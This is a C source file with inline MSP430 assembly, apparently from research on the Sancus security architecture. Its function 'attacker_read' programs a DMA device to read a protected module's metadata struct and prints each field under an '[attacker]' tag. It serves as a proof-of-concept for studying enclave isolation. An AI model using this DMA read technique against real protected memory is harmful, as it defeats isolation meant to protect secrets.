#include <stdio.h>
#include <sancus_support/sm_io.h>


void attacker_read(struct SancusModule* address)
{
	uint16_t config_register;
	uint16_t num_of_words = 7;
	uint16_t sm_struct_val[7];
	
	int counter = 0;
	uint16_t* tmp_var = 0;	
	
	// DMA device's op-codes 
	const uint16_t WRITE_OP       = 0x0001;
	const uint16_t END_WRITE      = 0x8000;
	const uint16_t READ_OP        = 0x0005;
	const uint16_t END_READ       = 0x8004;
	const uint16_t READ_OP_ACK    = 0x001D;
	const uint16_t WAIT_ACK_READ  = 0x200D;
    const uint16_t END_READ_ACK   = 0xA00C;	

	asm(" ; Define memory addresses  \n\t"
		".equ START_ADDR_REG , 0x0100 \n\t"
		".equ N_WORDS_REG    , 0x0102 \n\t"
		".equ CONFIG_REG     , 0x0104 \n\t"	
		".equ DATA_REG       , 0x0106 \n\t"
		".equ OUT_REG        , 0x0108 \n\t"
		".equ READ_OP        , 0x0005 \n\t"
		".equ END_READ       , 0x8004 \n\t"
		".equ WRITE_OP       , 0x0001 \n\t"
		".equ END_WRITE      , 0x8000 \n\t"
		".equ READ_OP_ACK    , 0x001D \n\t"
		".equ WAIT_ACK_READ  , 0x200D \n\t"
		".equ END_READ_ACK   , 0xA00C \n\t"
		".equ CONFIG_REG     , 0x0104 \n\t"
		" ; Start reading operation   \n\t"
		" mov %1             , &START_ADDR_REG \n\t"
		" mov %2             , &N_WORDS_REG    \n\t" 
		" mov #READ_OP_ACK   , &CONFIG_REG     \n\t"
		" mov &0x0104        , %0     \n\t"
		: "=m"(config_register) //outputs
		: "m"(address), //inputs
		  "m"(num_of_words) );

	while (config_register != END_READ_ACK) 
	{
		//wait until the end of operation and save the data
		asm(" mov &DATA_REG , %1 \n\t"
			" mov &0x0104   , %0" 
			: "=m"(config_register), "=m"(sm_struct_val[counter]) /*outputs*/ );
		if (config_register == WAIT_ACK_READ)
		{
			asm(" mov #READ_OP_ACK , &CONFIG_REG \n\t");
		}		
		counter=counter+1;	
	}
	
	char stringa[11];
	for(counter=0; counter<7; counter++)
	{
		switch (counter)
		{
			case 0:
				stpcpy(stringa, "sm_id");
				break;
			case 1:
				stpcpy(stringa, "vendor_id");
				break;
			case 2:
				stpcpy(stringa ,"name");
				break;
			case 3:
				stpcpy(stringa, "text_start");
				break;
			case 4:
				stpcpy(stringa, "text_end");
				break;
			case 5:
				stpcpy(stringa, "data_start");
				break;
			case 6:
				stpcpy(stringa, "data_end");
				break;
		}
		printf("[attacker] %s \t: 0x%.4x \n",stringa,sm_struct_val[counter]);
	}  
		  
}



       
